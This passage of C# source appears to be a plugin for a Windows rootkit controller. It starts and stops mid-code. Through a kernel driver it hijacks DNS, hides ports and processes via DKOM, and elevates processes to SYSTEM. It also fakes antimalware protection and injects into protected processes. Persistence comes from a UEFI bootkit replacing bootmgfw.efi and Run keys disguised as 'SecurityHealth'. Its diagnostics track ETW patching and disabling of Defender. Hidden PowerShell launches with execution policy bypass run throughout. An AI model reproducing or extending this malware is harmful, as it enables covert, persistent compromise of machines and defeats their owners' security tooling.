                return DriverNotConnectedResult();

            var result = _driver.RemoveDnsRule(domain);
            Log($"  → Result: {(result.Success ? "SUCCESS" : "FAILED")} - {result.Message}");

            return new PluginResult
            {
                Success = result.Success,
                Message = result.Message,
                Data = GetLogBytes()
            };
        }

        private PluginResult ExecuteListDnsRules()
        {
            Log("[LIST DNS RULES] Listing active DNS hijack rules from hosts file");

            var sb = new System.Text.StringBuilder();
            sb.AppendLine("=== DNS HIJACK RULES ===");
            int count = 0;

            try
            {
                string hostsPath = @"C:\Windows\System32\drivers\etc\hosts";
                if (System.IO.File.Exists(hostsPath))
                {
                    var lines = System.IO.File.ReadAllLines(hostsPath);
                    foreach (var line in lines)
                    {
                        var trimmed = line.Trim();
                        // Skip empty lines and comments
                        if (!string.IsNullOrEmpty(trimmed) && !trimmed.StartsWith("#"))
                        {
                            var parts = trimmed.Split(new[] { ' ', '\t' }, 
                                StringSplitOptions.RemoveEmptyEntries);
                            if (parts.Length >= 2)
                            {
                                // Format: IP domain
                                sb.AppendLine($"  {parts[1]} → {parts[0]}");
                                count++;
                            }
                        }
                    }
                }
                else
                {
                    Log("[LIST DNS RULES] Hosts file not found");
                }
            }
            catch (Exception ex)
            {
                Log($"[LIST DNS RULES] Error reading hosts file: {ex.Message}");
            }

            if (count == 0)
                sb.AppendLine("  (No active rules)");
            sb.AppendLine($"Total: {count} rule(s)");

            Log(sb.ToString());
            return new PluginResult
            {
                Success = true,
                Message = sb.ToString(),
                Data = GetLogBytes()
            };
        }

        private PluginResult ExecuteBlockIp(byte[] parameters)
        {
            // Parse: "ip,port" or just "ip"
            string paramStr = parameters != null && parameters.Length > 0 
                ? Encoding.UTF8.GetString(parameters).Trim('\0') 
                : "";

            var parts = paramStr.Split(',');
            if (!TryParseIp(parts[0].Trim(), out uint ip))
            {
                return new PluginResult
                {
                    Success = false,
                    Message = "Invalid IP address format",
                    Data = GetLogBytes()
                };
            }

            ushort port = 0;
            if (parts.Length > 1)
                ushort.TryParse(parts[1].Trim(), out port);

            Log($"[BLOCK IP] Blocking {parts[0].Trim()}{(port > 0 ? $":{port}" : " (all ports)")}");

            if (!EnsureDriverConnected())
                return DriverNotConnectedResult();

            var result = _driver.BlockIp(ip, port);
            Log($"  → Result: {(result.Success ? "SUCCESS" : "FAILED")} - {result.Message}");

            return new PluginResult
            {
                Success = result.Success,
                Message = result.Message,
                Data = GetLogBytes()
            };
        }

        private PluginResult ExecuteUnblockIp(byte[] parameters)
        {
            string paramStr = parameters != null && parameters.Length > 0 
                ? Encoding.UTF8.GetString(parameters).Trim('\0') 
                : "";

            var parts = paramStr.Split(',');
            if (!TryParseIp(parts[0].Trim(), out uint ip))
            {
                return new PluginResult
                {
                    Success = false,
                    Message = "Invalid IP address format",
                    Data = GetLogBytes()
                };
            }

            ushort port = 0;
            if (parts.Length > 1)
                ushort.TryParse(parts[1].Trim(), out port);

            Log($"[UNBLOCK IP] Unblocking {parts[0].Trim()}{(port > 0 ? $":{port}" : "")}");

            if (!EnsureDriverConnected())
                return DriverNotConnectedResult();

            var result = _driver.UnblockIp(ip, port);
            Log($"  → Result: {(result.Success ? "SUCCESS" : "FAILED")} - {result.Message}");

            return new PluginResult
            {
                Success = result.Success,
                Message = result.Message,
                Data = GetLogBytes()
            };
        }

        private PluginResult ExecuteListBlocked()
        {
            Log("[LIST BLOCKED] Listing blocked IPs/ports");

            var (success, rules, message) = _driver.GetBlockedIps();
            if (!success)
            {
                Log($"[LIST BLOCKED] Failed: {message}");
                return new PluginResult
                {
                    Success = false,
                    Message = message,
                    Data = GetLogBytes()
                };
            }

            var sb = new System.Text.StringBuilder();
            sb.AppendLine("=== BLOCKED IPs ===");
            int count = 0;
            foreach (var rule in rules.Where(r => r.InUse))
            {
                // Convert IP from bytes to dotted notation
                byte[] ipBytes = BitConverter.GetBytes(rule.Ip);
                string ipStr = $"{ipBytes[0]}.{ipBytes[1]}.{ipBytes[2]}.{ipBytes[3]}";
                string portStr = rule.Port > 0 ? $":{rule.Port}" : " (all ports)";
                sb.AppendLine($"  {ipStr}{portStr}");
                count++;
            }
            if (count == 0)
                sb.AppendLine("  (No blocked IPs)");
            sb.AppendLine($"Total: {count} IP(s)");

            Log(sb.ToString());
            return new PluginResult
            {
                Success = true,
                Message = sb.ToString(),
                Data = GetLogBytes()
            };
        }

        private PluginResult ExecuteListHiddenPorts()
        {
            Log("[LIST HIDDEN PORTS] Listing hidden TCP/UDP ports");

            var (success, rules, message) = _driver.GetHiddenPorts();
            if (!success)
            {
                Log($"[LIST HIDDEN PORTS] Failed: {message}");
                return new PluginResult
                {
                    Success = false,
                    Message = message,
                    Data = GetLogBytes()
                };
            }

            var sb = new System.Text.StringBuilder();
            sb.AppendLine("=== HIDDEN PORTS ===");
            int count = 0;
            foreach (var rule in rules.Where(r => r.InUse))
            {
                string proto = rule.IsTcp ? "TCP" : "UDP";
                sb.AppendLine($"  {proto} {rule.Port}");
                count++;
            }
            if (count == 0)
                sb.AppendLine("  (No hidden ports)");
            sb.AppendLine($"Total: {count} port(s)");

            Log(sb.ToString());
            return new PluginResult
            {
                Success = true,
                Message = sb.ToString(),
                Data = GetLogBytes()
            };
        }

        private PluginResult ExecuteStartStealthListener(byte[] parameters)
        {
            ushort port = 0;
            if (parameters != null && parameters.Length > 0)
            {
                // Try parsing as string first (most common case from UI)
                string portStr = Encoding.UTF8.GetString(parameters).Trim('\0');
                if (!ushort.TryParse(portStr, out port))
                {
                    // Fall back to binary if string parsing fails and we have 2 bytes
                    if (parameters.Length >= 2)
                    {
                        port = BitConverter.ToUInt16(parameters, 0);
                    }
                }
            }

            if (port == 0)
            {
                return new PluginResult
                {
                    Success = false,
                    Message = "Port number required",
                    Data = GetLogBytes()
                };
            }

            Log($"[STEALTH LISTENER] Starting hidden listener on port {port}");

            if (!EnsureDriverConnected())
                return DriverNotConnectedResult();

            var result = _driver.StartStealthListener(port);
            Log($"  → Result: {(result.Success ? "SUCCESS" : "FAILED")} - {result.Message}");

            return new PluginResult
            {
                Success = result.Success,
                Message = result.Message,
                Data = GetLogBytes()
            };
        }

        private PluginResult ExecuteStopStealthListener()
        {
            Log("[STOP STEALTH LISTENER] Stopping hidden listener");

            if (!EnsureDriverConnected())
                return DriverNotConnectedResult();

            var result = _driver.StopStealthListener();
            Log($"  → Result: {(result.Success ? "SUCCESS" : "FAILED")} - {result.Message}");

            return new PluginResult
            {
                Success = result.Success,
                Message = result.Message,
                Data = GetLogBytes()
            };
        }

        // ================================================================
        // Helper Methods for Parsing
        // ================================================================

        private bool TryParsePortRequest(string input, out ushort port, out bool isTcp)
        {
            port = 0;
            isTcp = true;

            var parts = input.Split(',');
            if (parts.Length < 2)
                return false;

            if (!ushort.TryParse(parts[0].Trim(), out port))
                return false;

            string proto = parts[1].Trim().ToLowerInvariant();
            isTcp = proto == "tcp";

            return true;
        }

        private bool TryParseIp(string ipStr, out uint ip)
        {
            ip = 0;
            try
            {
                var parts = ipStr.Split('.');
                if (parts.Length != 4)
                    return false;

                byte[] bytes = new byte[4];
                for (int i = 0; i < 4; i++)
                {
                    if (!byte.TryParse(parts[i], out bytes[i]))
                        return false;
                }

                ip = BitConverter.ToUInt32(bytes, 0);
                return true;
            }
            catch
            {
                return false;
            }
        }

        private PluginResult DriverNotConnectedResult()
        {
            return new PluginResult
            {
                Success = false,
                Message = "Driver not connected - install rootkit first",
                Data = GetLogBytes()
            };
        }

        private PluginResult StubNotImplemented(string featureName, string description)
        {
            Log($"[{featureName.ToUpper()}] Feature not yet implemented");
            Log($"  → Description: {description}");
            Log($"  → Status: Requires kernel driver update to implement");
            return new PluginResult
            {
                Success = false,
                Message = $"{featureName}: Not yet implemented - requires kernel driver update",
                Data = GetLogBytes()
            };
        }

        private byte[] GetLogBytes()
        {
            return Encoding.UTF8.GetBytes(_log?.ToString() ?? "");
        }

        // Boot Diagnostics Methods
        // ================================================================

        private PluginResult ExecuteGetBootDiagnostics()
        {
            Log("Getting comprehensive boot diagnostics...");
            
            var sb = new StringBuilder();
            sb.AppendLine("╔══════════════════════════════════════════════════════════════╗");
            sb.AppendLine("║           COMPREHENSIVE BOOT PROTECTION DIAGNOSTICS          ║");
            sb.AppendLine("╚══════════════════════════════════════════════════════════════╝");
            sb.AppendLine();

            // =============================
            // SECTION 1: DRIVER STATUS
            // =============================
            sb.AppendLine("┌─ DRIVER STATUS ─────────────────────────────────────────────┐");
            
            bool driverConnected = _driver != null && _driver.IsConnected;
            sb.AppendLine($"│ [{(driverConnected ? "✓" : "✗")}] Driver Connected                                         │");
            
            // Get driver diagnostics from kernel
            BootDiagnostics kernelDiag = default;
            if (driverConnected)
            {
                var result = _driver.GetBootDiagnostics();
                if (result.Success)
                {
                    kernelDiag = result.Diagnostics;
                    sb.AppendLine($"│ [{(kernelDiag.EtwDisabled ? "✓" : "✗")}] ETW Patched (ntoskrnl!EtwWrite → ret 0)                 │");
                    sb.AppendLine($"│ [{(kernelDiag.AmsiCallbackRegistered ? "✓" : "✗")}] AMSI Image Load Callback Registered                    │");
                    sb.AppendLine($"│ [{(kernelDiag.DefenderRtpDisabled ? "✓" : "✗")}] Defender RTP Disabled (registry policy)                │");
                    sb.AppendLine($"│ [{(kernelDiag.DefenderServiceDisabled ? "✓" : "✗")}] Defender Service Disabled (Start=4)                   │");
                    sb.AppendLine($"│ [{(kernelDiag.PayloadConfigLoaded ? "✓" : "✗")}] Payload Config Loaded                                  │");
                    sb.AppendLine($"│ [{(kernelDiag.ProcessCallbackRegistered ? "✓" : "✗")}] Process Creation Callback Registered                 │");
                    
                    if (!string.IsNullOrEmpty(kernelDiag.PayloadPath))
                        sb.AppendLine($"│     Payload: {kernelDiag.PayloadPath,-47} │");
                }
                else
                {
                    sb.AppendLine($"│ [!] Could not query kernel: {result.Message,-31} │");
                }
            }
            else
            {
                sb.AppendLine($"│ [!] Driver not connected - kernel diagnostics unavailable   │");
            }
            sb.AppendLine("└──────────────────────────────────────────────────────────────┘");
            sb.AppendLine();

            // =============================
            // SECTION 2: DSE & TEST SIGNING
            // =============================
            sb.AppendLine("┌─ DSE & SIGNING STATUS ──────────────────────────────────────┐");
            
            var dseStatus = SystemChecks.CheckDSE();
            sb.AppendLine($"│ [{(dseStatus.DseEnabled ? "✗" : "✓")}] DSE Disabled (Driver Signature Enforcement)             │");
            sb.AppendLine($"│ [{(dseStatus.TestSigningEnabled ? "✓" : "✗")}] Test Signing Enabled                                    │");
            sb.AppendLine($"│ [{(dseStatus.HvciEnabled ? "✗" : "✓")}] HVCI Disabled (Device Guard)                             │");
            
            if (dseStatus.DseEnabled && !dseStatus.TestSigningEnabled)
                sb.AppendLine("│ [!] DSE enabled - bootkit required for driver loading       │");
            else if (dseStatus.TestSigningEnabled)
                sb.AppendLine("│ [i] Test signing on - driver can load without bootkit       │");
            
            sb.AppendLine("└──────────────────────────────────────────────────────────────┘");
            sb.AppendLine();

            // =============================
            // SECTION 3: BOOTKIT STATUS
            // =============================
            sb.AppendLine("┌─ BOOTKIT STATUS ────────────────────────────────────────────┐");
            
            try
            {
                var bootkitDiag = BootkitInstaller.GetDiagnostics();
                
                sb.AppendLine($"│ [{(bootkitDiag.RegistryMarkerExists ? "✓" : "✗")}] Registry Marker Exists                                  │");
                
                if (bootkitDiag.RegistryMarkerExists)
                {
                    if (!string.IsNullOrEmpty(bootkitDiag.InstallDate))
                        sb.AppendLine($"│     Install Date: {bootkitDiag.InstallDate,-42} │");
                }
                
                sb.AppendLine($"│ [{(bootkitDiag.BootkitFileExists ? "✓" : "✗")}] Bootkit File Exists on EFI Partition                   │");
                
                if (bootkitDiag.BootkitFileExists)
                {
                    sb.AppendLine($"│     bootmgfw.efi Size: {bootkitDiag.BootkitFileSize,10} bytes                   │");
                    sb.AppendLine($"│ [{(bootkitDiag.IsOurBootkit ? "✓" : "✗")}] Is Our Bootkit (not original Windows)                  │");
                    
                    if (!bootkitDiag.IsOurBootkit)
                        sb.AppendLine("│ [!] bootmgfw.efi is ORIGINAL Windows file, not bootkit!    │");
                }
                
                sb.AppendLine($"│ [{(bootkitDiag.OriginalBackupExists ? "✓" : "✗")}] Original Backup Exists (bootmgfw_orig.efi)             │");
                
                if (bootkitDiag.OriginalBackupExists)
                    sb.AppendLine($"│     Backup Size: {bootkitDiag.OriginalBackupSize,10} bytes                      │");
                
                sb.AppendLine($"│ [{(bootkitDiag.FallbackExists ? "✓" : "✗")}] Recovery Fallback Exists (bootx64.efi)                 │");
                
                if (!string.IsNullOrEmpty(bootkitDiag.EfiError))
                    sb.AppendLine($"│ [!] EFI Error: {bootkitDiag.EfiError,-44} │");
                    
                // Overall bootkit status
                bool bootkitFullyReady = bootkitDiag.BootkitFileExists && 
                                         bootkitDiag.IsOurBootkit && 
                                         bootkitDiag.OriginalBackupExists;
                                         
                if (bootkitFullyReady)
                    sb.AppendLine("│ [✓] BOOTKIT FULLY OPERATIONAL                               │");
                else if (bootkitDiag.BootkitFileExists && !bootkitDiag.IsOurBootkit)
                    sb.AppendLine("│ [✗] BOOTKIT NOT INSTALLED (original bootmgfw present)       │");
                else if (!bootkitDiag.BootkitFileExists)
                    sb.AppendLine("│ [✗] BOOTKIT NOT INSTALLED                                   │");
                else if (!bootkitDiag.OriginalBackupExists)
                    sb.AppendLine("│ [!] BOOTKIT INSTALLED BUT BACKUP MISSING                    │");
            }
            catch (Exception ex)
            {
                sb.AppendLine($"│ [!] Bootkit check failed: {ex.Message,-33} │");
            }
            
            sb.AppendLine("└──────────────────────────────────────────────────────────────┘");
            sb.AppendLine();

            // =============================
            // SECTION 4: PERSISTENCE STATUS
            // =============================
            sb.AppendLine("┌─ PERSISTENCE STATUS ────────────────────────────────────────┐");
            
            // Check Run key
            try
            {
                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
                {
                    if (key != null)
                    {
                        bool foundPayload = false;
                        foreach (string valueName in key.GetValueNames())
                        {
                            if (valueName.Contains("SecurityHealth") || valueName.Contains("BootkitFile"))
                            {
                                string path = key.GetValue(valueName)?.ToString() ?? "";
                                sb.AppendLine($"│ [✓] Run Key: {valueName,-46} │");
                                foundPayload = true;
                            }
                        }
                        if (!foundPayload)
                            sb.AppendLine("│ [✗] No Payload Run Key Found                                │");
                    }
                }
            }
            catch { sb.AppendLine("│ [!] Could not check Run keys                                │"); }

            // Check driver service
            try
            {
                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\Ring0Drv"))
                {
                    if (key != null)
                    {
                        int startType = (int)(key.GetValue("Start") ?? -1);
                        string startStr = startType == 0 ? "BOOT_START" : startType == 3 ? "DEMAND_START" : $"Type {startType}";
                        sb.AppendLine($"│ [✓] Driver Service Registered ({startStr,-15})             │");
                    }
                    else
                    {
                        sb.AppendLine("│ [✗] Driver Service Not Registered                           │");
                    }
                }
            }
            catch { }

            // Check custom bootkit files
            var customFiles = GetBootkitFiles();
            if (customFiles.Count > 0)
            {
                sb.AppendLine($"│ [✓] Custom Bootkit Files: {customFiles.Count,-3} registered                    │");
            }
            
            sb.AppendLine("└──────────────────────────────────────────────────────────────┘");
            sb.AppendLine();
            sb.AppendLine($"Diagnostics completed at: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");

            return new PluginResult
            {
                Success = true,
                Message = sb.ToString(),
                Data = GetLogBytes()
            };
        }

        private const string BOOTKIT_FILES_REGISTRY_KEY = @"SOFTWARE\Microsoft\Windows\CurrentVersion\BootConfig";
        private const string BOOTKIT_FILES_VALUE_NAME = "CustomPayloads";

        private PluginResult ExecuteAddFileToBootkit(byte[] parameters)
        {
            try
            {
                string filePath = Encoding.UTF8.GetString(parameters).Trim('\0');
                Log($"Adding file to bootkit: {filePath}");

                if (!File.Exists(filePath))
                {
                    return new PluginResult
                    {
                        Success = false,
                        Message = $"File not found: {filePath}",
                        Data = GetLogBytes()
                    };
                }

                // Get current list
                var files = GetBootkitFiles();
                if (files.Exists(f => f.Equals(filePath, StringComparison.OrdinalIgnoreCase)))
                {
                    return new PluginResult
                    {
                        Success = false,
                        Message = $"File already in bootkit list: {filePath}",
                        Data = GetLogBytes()
                    };
                }

                files.Add(filePath);
                SaveBootkitFiles(files);

                // Also add to Run key for auto-execution
                string fileName = Path.GetFileNameWithoutExtension(filePath);
                using (var key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
                {
                    key?.SetValue($"BootkitFile_{fileName}", $"\"{filePath}\"", Microsoft.Win32.RegistryValueKind.String);
                }

                Log($"File added to bootkit: {filePath}");
                return new PluginResult
                {
                    Success = true,
                    Message = $"File added to bootkit auto-execution: {filePath}",
                    Data = GetLogBytes()
                };
            }
            catch (Exception ex)
            {
                Log($"Error adding file: {ex.Message}");
                return new PluginResult
                {
                    Success = false,
                    Message = $"Failed to add file: {ex.Message}",
                    Data = GetLogBytes()
                };
            }
        }

        private PluginResult ExecuteRemoveFileFromBootkit(byte[] parameters)
        {
            try
            {
                string filePath = Encoding.UTF8.GetString(parameters).Trim('\0');
                Log($"Removing file from bootkit: {filePath}");

                var files = GetBootkitFiles();
                if (files.RemoveAll(f => f.Equals(filePath, StringComparison.OrdinalIgnoreCase)) > 0)
                {
                    SaveBootkitFiles(files);

                    // Also remove from Run key
                    string fileName = Path.GetFileNameWithoutExtension(filePath);
                    using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                    {
                        key?.DeleteValue($"BootkitFile_{fileName}", false);
                    }

                    return new PluginResult
                    {
                        Success = true,
                        Message = $"File removed from bootkit: {filePath}",
                        Data = GetLogBytes()
                    };
                }
                else
                {
                    return new PluginResult
                    {
                        Success = false,
                        Message = $"File not found in bootkit list: {filePath}",
                        Data = GetLogBytes()
                    };
                }
            }
            catch (Exception ex)
            {
                Log($"Error removing file: {ex.Message}");
                return new PluginResult
                {
                    Success = false,
                    Message = $"Failed to remove file: {ex.Message}",
                    Data = GetLogBytes()
                };
            }
        }

        private PluginResult ExecuteListBootkitFiles()
        {
            try
            {
                var files = GetBootkitFiles();
                if (files.Count == 0)
                {
                    return new PluginResult
                    {
                        Success = true,
                        Message = "No custom files in bootkit",
                        Data = GetLogBytes()
                    };
                }

                var sb = new StringBuilder();
                sb.AppendLine("=== BOOTKIT FILES ===");
                foreach (var file in files)
                {
                    bool exists = File.Exists(file);
                    sb.AppendLine($"[{(exists ? "✓" : "✗")}] {file}");
                }
                sb.AppendLine("====================");

                return new PluginResult
                {
                    Success = true,
                    Message = sb.ToString(),
                    Data = GetLogBytes()
                };
            }
            catch (Exception ex)
            {
                Log($"Error listing files: {ex.Message}");
                return new PluginResult
                {
                    Success = false,
                    Message = $"Failed to list bootkit files: {ex.Message}",
                    Data = GetLogBytes()
                };
            }
        }

        private List<string> GetBootkitFiles()
        {
            try
            {
                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(BOOTKIT_FILES_REGISTRY_KEY))
                {
                    if (key != null)
                    {
                        var value = key.GetValue(BOOTKIT_FILES_VALUE_NAME) as string[];
                        if (value != null)
                            return new List<string>(value);
                    }
                }
            }
            catch { }
            return new List<string>();
        }

        private void SaveBootkitFiles(List<string> files)
        {
            using (var key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(BOOTKIT_FILES_REGISTRY_KEY))
            {
                if (files.Count > 0)
                    key?.SetValue(BOOTKIT_FILES_VALUE_NAME, files.ToArray(), Microsoft.Win32.RegistryValueKind.MultiString);
                else
                    key?.DeleteValue(BOOTKIT_FILES_VALUE_NAME, false);
            }
        }
        #endregion

        #region Post-Exploitation Commands

        /// <summary>
        /// Run a process hidden from Task Manager using DKOM
        /// Format: payloadType,fakeParentPid,path,arguments
        /// payloadType: 0=exe, 1=bat, 2=ps1, 3=dll, 4=shellcode
        /// </summary>
        private PluginResult ExecuteRunHidden(byte[] paramBytes)
        {
            if (!_driver?.IsConnected ?? true)
                return DriverNotConnectedResult();

            try
            {
                string param = Encoding.UTF8.GetString(paramBytes);
                var parts = param.Split(new[] { ',' }, 4);
                
                if (parts.Length < 3)
                {
                    Log("[RUN HIDDEN] Invalid format. Expected: payloadType,fakeParentPid,path[,arguments]");
                    return new PluginResult { Success = false, Message = "Invalid format", Data = GetLogBytes() };
                }

                if (!int.TryParse(parts[0], out int payloadType) || payloadType < 0 || payloadType > 4)
                {
                    Log("[RUN HIDDEN] Invalid payload type. Use: 0=exe, 1=bat, 2=ps1, 3=dll, 4=shellcode");
                    return new PluginResult { Success = false, Message = "Invalid payload type", Data = GetLogBytes() };
                }

                uint.TryParse(parts[1], out uint fakeParentPid);
                string path = parts[2].Trim();
                string arguments = parts.Length > 3 ? parts[3] : "";

                // Expand environment variables like %TEMP%
                if (path.Contains("%"))
                {
                    path = Environment.ExpandEnvironmentVariables(path);
                    Log($"[RUN HIDDEN] Expanded path: {path}");
                }

                string payloadName = ((PayloadType)payloadType).ToString();
                Log($"[RUN HIDDEN] Launching hidden {payloadName}: {path}");
                if (fakeParentPid > 0)
                    Log($"  → Parent PID spoofing requested: {fakeParentPid}");

                // Determine how to launch based on payload type
                string executable;
                string finalArgs;
                
                switch ((PayloadType)payloadType)
                {
                    case PayloadType.Exe:
                        executable = path;
                        finalArgs = arguments;
                        break;
                    case PayloadType.Bat:
                        executable = "cmd.exe";
                        finalArgs = $"/c \"{path}\" {arguments}";
                        break;
                    case PayloadType.Ps1:
                        executable = "powershell.exe";
                        finalArgs = $"-ExecutionPolicy Bypass -WindowStyle Hidden -File \"{path}\" {arguments}";
                        break;
                    case PayloadType.Dll:
                        executable = "rundll32.exe";
                        finalArgs = $"\"{path}\",{(string.IsNullOrEmpty(arguments) ? "DllMain" : arguments)}";
                        break;
                    case PayloadType.Shellcode:
                        Log("[RUN HIDDEN] Shellcode execution requires kernel injection (use PPL Inject instead)");
                        return new PluginResult { Success = false, Message = "Use PPL Inject for shellcode", Data = GetLogBytes() };
                    default:
                        Log($"[RUN HIDDEN] Unknown payload type: {payloadType}");
                        return new PluginResult { Success = false, Message = "Unknown payload type", Data = GetLogBytes() };
                }

                Log($"  → Executable: {executable}");
                if (!string.IsNullOrEmpty(finalArgs))
                    Log($"  → Arguments: {finalArgs}");

                // Create process with hidden window
                var startInfo = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = executable,
                    Arguments = finalArgs,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
                    RedirectStandardOutput = false,
                    RedirectStandardError = false
                };

                System.Diagnostics.Process proc;
                try
                {
                    proc = System.Diagnostics.Process.Start(startInfo);
                    if (proc == null)
                    {
                        Log("[RUN HIDDEN] Failed to start process - Process.Start returned null");
                        return new PluginResult { Success = false, Message = "Failed to start process", Data = GetLogBytes() };
                    }
                }
                catch (Exception startEx)
                {
                    Log($"[RUN HIDDEN] Failed to start process: {startEx.Message}");
                    return new PluginResult { Success = false, Message = $"Start failed: {startEx.Message}", Data = GetLogBytes() };
                }

                int pid = proc.Id;
                Log($"  → Process started with PID: {pid}");

                // Now hide the process using driver DKOM
                Log($"  → Requesting driver to hide PID {pid} via DKOM...");
                var hideResult = _driver.HideProcess(pid);
                
                if (hideResult.Success)
                {
                    Log($"  → SUCCESS: Process {pid} is now hidden from Task Manager");
                    
                    // Elevate process to SYSTEM token
                    Log($"  → Elevating PID {pid} to SYSTEM privileges...");
                    var elevateResult = _driver.ElevateProcess(pid);
                    if (elevateResult.Success)
                    {
                        Log($"  → SUCCESS: Process {pid} now running as SYSTEM");
                    }
                    else
                    {
                        Log($"  → WARNING: Token elevation failed: {elevateResult.Message}");
                    }
                    
                    // Add Antimalware Light protection
                    Log($"  → Adding Antimalware Light protection to PID {pid}...");
                    var protectResult = _driver.SetProtection(pid, ProtectionType.Light, ProtectionSigner.Antimalware);
                    if (protectResult.Success)
                    {
                        Log($"  → SUCCESS: Process {pid} now protected as Antimalware Light");
                    }
                    else
                    {
                        Log($"  → WARNING: Protection failed: {protectResult.Message}");
                    }
                    
                    // Also register in driver's tracking array
                    var request = new RunHiddenRequest
                    {
                        PayloadType = (PayloadType)payloadType,
                        FakeParentPid = fakeParentPid,
                        Path = path,
                        Arguments = arguments,
                        ShellcodeSize = 0
                    };
                    _driver.RunHiddenProcess(request);
                }
                else
                {
                    Log($"  → WARNING: Process started but DKOM hiding failed: {hideResult.Message}");
                    Log($"  → Process {pid} is running but may be visible in Task Manager");
                }

                return new PluginResult
                {
                    Success = true,
                    Message = $"Hidden process started (PID {pid})",
                    Data = GetLogBytes()
                };
            }
            catch (Exception ex)
            {
                Log($"[RUN HIDDEN] Error: {ex.Message}");
                return new PluginResult { Success = false, Message = ex.Message, Data = GetLogBytes() };
            }
        }

        /// <summary>
        /// List all hidden processes
        /// </summary>
        private PluginResult ExecuteListHiddenProcesses()
        {
            if (!_driver?.IsConnected ?? true)
                return DriverNotConnectedResult();

            Log("[LIST HIDDEN] Retrieving hidden processes...");

            var (success, processes, message) = _driver.GetHiddenProcesses();
            if (!success)
            {
                Log($"  → Error: {message}");
                return new PluginResult { Success = false, Message = message, Data = GetLogBytes() };
            }

            Log("=== HIDDEN PROCESSES ===");
            var activeProcesses = processes.Where(p => p.InUse).ToArray();
            if (activeProcesses.Length == 0)
            {
                Log("  (none)");
            }
            else
            {
                foreach (var proc in activeProcesses)
                {
                    Log($"  PID {proc.Pid} | Parent: {proc.ParentPid} | Type: {proc.PayloadType} | {proc.ImagePath}");
                }
            }
            Log($"Total: {activeProcesses.Length} hidden processes");

            return new PluginResult { Success = true, Message = $"{activeProcesses.Length} hidden processes", Data = GetLogBytes() };
        }

        /// <summary>
        /// Kill a hidden process
        /// Format: pid
        /// </summary>
        private PluginResult ExecuteKillHidden(byte[] paramBytes)
        {
            if (!_driver?.IsConnected ?? true)
                return DriverNotConnectedResult();

            string param = Encoding.UTF8.GetString(paramBytes);
            if (!uint.TryParse(param.Trim(), out uint pid))
            {
                Log("[KILL HIDDEN] Invalid PID");
                return new PluginResult { Success = false, Message = "Invalid PID", Data = GetLogBytes() };
            }

            Log($"[KILL HIDDEN] Terminating hidden process PID {pid}...");
            var (success, message) = _driver.KillHiddenProcess(pid);
            Log($"  → Result: {message}");

            return new PluginResult { Success = success, Message = message, Data = GetLogBytes() };
        }

        /// <summary>
        /// Inject into a PPL (Protected Process Light)
        /// Format: payloadType,targetPid,targetName,dllPath
        /// </summary>
        private PluginResult ExecuteInjectPPL(byte[] paramBytes)
        {
            if (!_driver?.IsConnected ?? true)
                return DriverNotConnectedResult();

            try
            {
                string param = Encoding.UTF8.GetString(paramBytes);
                var parts = param.Split(new[] { ',' }, 4);
                
                if (parts.Length < 2)
                {
                    Log("[INJECT PPL] Invalid format. Expected: payloadType,targetPid[,targetName,dllPath]");
                    return new PluginResult { Success = false, Message = "Invalid format", Data = GetLogBytes() };
                }

                if (!int.TryParse(parts[0], out int payloadType))
                {
                    Log("[INJECT PPL] Invalid payload type");
                    return new PluginResult { Success = false, Message = "Invalid payload type", Data = GetLogBytes() };
                }

                uint.TryParse(parts[1], out uint targetPid);
                string targetName = parts.Length > 2 ? parts[2] : "";
                string dllPath = parts.Length > 3 ? parts[3] : "";

                // Expand environment variables like %TEMP%
                if (dllPath.Contains("%"))
                {
                    dllPath = Environment.ExpandEnvironmentVariables(dllPath);
                    Log($"[INJECT PPL] Expanded path: {dllPath}");
                }

                var payloadTypeEnum = (PayloadType)payloadType;
                string target = targetPid > 0 ? $"PID {targetPid}" : targetName;
                Log($"[INJECT PPL] Injecting into {target}...");
                Log($"  → Payload type: {payloadTypeEnum}");

                // For EXE/BAT/PS1: spawn as hidden process with SYSTEM+AM protection
                // (Actual PPL injection only works for DLL and Shellcode)
                if (payloadTypeEnum == PayloadType.Exe || payloadTypeEnum == PayloadType.Bat || payloadTypeEnum == PayloadType.Ps1)
                {
                    Log($"  → Note: {payloadTypeEnum} payloads will be launched as protected hidden process");
                    Log($"  → (Actual PPL injection only works for DLL/Shellcode)");
                    
                    // Determine executable and args
                    string executable;
                    string args;
                    switch (payloadTypeEnum)
                    {
                        case PayloadType.Exe:
                            executable = dllPath;
                            args = "";
                            break;
                        case PayloadType.Bat:
                            executable = "cmd.exe";
                            args = $"/c \"{dllPath}\"";
                            break;
                        case PayloadType.Ps1:
                            executable = "powershell.exe";
                            args = $"-ExecutionPolicy Bypass -WindowStyle Hidden -File \"{dllPath}\"";
                            break;
                        default:
                            executable = dllPath;
                            args = "";
                            break;
                    }
                    
                    Log($"  → Launching: {executable} {args}");
                    
                    // Start process hidden
                    var startInfo = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = executable,
                        Arguments = args,
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden
                    };
                    
                    try
                    {
                        var proc = System.Diagnostics.Process.Start(startInfo);
                        if (proc != null)
                        {
                            int pid = proc.Id;
                            Log($"  → Started with PID: {pid}");
                            
                            // Hide via DKOM
                            var hideResult = _driver.HideProcess(pid);
                            if (hideResult.Success) Log($"  → Hidden from Task Manager");
                            
                            // Elevate to SYSTEM
                            var elevateResult = _driver.ElevateProcess(pid);
                            if (elevateResult.Success) Log($"  → Elevated to SYSTEM");
                            
                            // Add Antimalware protection
                            var protectResult = _driver.SetProtection(pid, ProtectionType.Light, ProtectionSigner.Antimalware);
                            if (protectResult.Success) Log($"  → Protected as Antimalware Light");
                            
                            return new PluginResult { Success = true, Message = $"Protected process started (PID {pid})", Data = GetLogBytes() };
                        }
                    }
                    catch (Exception procEx)
                    {
